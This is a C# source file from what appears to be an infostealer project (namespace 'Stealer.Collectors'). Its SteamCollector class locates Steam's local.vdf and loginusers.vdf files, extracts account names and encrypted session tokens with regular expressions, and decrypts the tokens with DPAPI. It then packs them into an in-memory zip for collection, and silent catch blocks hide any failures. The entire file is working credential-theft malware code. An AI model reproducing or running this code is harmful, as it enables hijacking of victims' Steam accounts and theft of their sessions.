using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using Stealer.Utils;
using Stealer.Crypto;

namespace Stealer.Collectors
{
    public class SteamCollector
    {
        public static void Collect(InMemoryZip zip)
        {
            try
            {
                RegistryKey steamKey = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
                if (steamKey == null || steamKey.GetValue("SteamPath") == null)
                    return;

                string steamPath = steamKey.GetValue("SteamPath").ToString();
                if (!Directory.Exists(steamPath))
                    return;

                var tokens = new List<string>();

                // Извлекаем токены
                try
                {
                    string[] localVdfPaths = new[]
                    {
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam", "local.vdf"),
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Steam", "local.vdf")
                    };

                    string[] loginUsersPaths = new[]
                    {
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam", "config", "loginusers.vdf"),
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam", "config", "loginusers.vdf"),
                        Path.Combine(steamPath, "config", "loginusers.vdf")
                    };

                    string localVdfPath = localVdfPaths.FirstOrDefault(File.Exists);
                    string loginUsersPath = loginUsersPaths.FirstOrDefault(File.Exists);

                    if (localVdfPath != null && loginUsersPath != null)
                    {
                        string accountPattern = @"""AccountName""\s*""([^""]+)""";
                        string tokenPattern = @"([a-fA-F0-9]{500,2000})";

                        var accountMatches = Regex.Matches(File.ReadAllText(loginUsersPath), accountPattern);
                        var tokenMatches = Regex.Matches(File.ReadAllText(localVdfPath), tokenPattern);

                        if (accountMatches.Count > 0 && tokenMatches.Count > 0)
                        {
                            foreach (Match accountMatch in accountMatches)
                            {
                                byte[] accountBytes = Encoding.UTF8.GetBytes(accountMatch.Groups[1].Value);

                                foreach (Match tokenMatch in tokenMatches)
                                {
                                    try
                                    {
                                        byte[] encryptedData = Enumerable.Range(0, tokenMatch.Value.Length / 2)
                                            .Select(x => Convert.ToByte(tokenMatch.Value.Substring(x * 2, 2), 16))
                                            .ToArray();

                                        byte[] decryptedBytes = DpApi.Decrypt(encryptedData, accountBytes);
                                        if (decryptedBytes != null)
                                        {
                                            string token = Encoding.UTF8.GetString(decryptedBytes);
                                            tokens.Add($"{accountMatch.Groups[1].Value}.{token}");
                                            break;
                                        }
                                    }
                                    catch { }
                                }
                            }
                        }
                    }
                }
                catch { }

                if (tokens.Count > 0)
                {
                    zip.AddTextFile("Games/Steam/SteamTokens.txt", string.Join("\n\n", tokens));
                }
            }
            catch
            {
            }
        }
    }
}
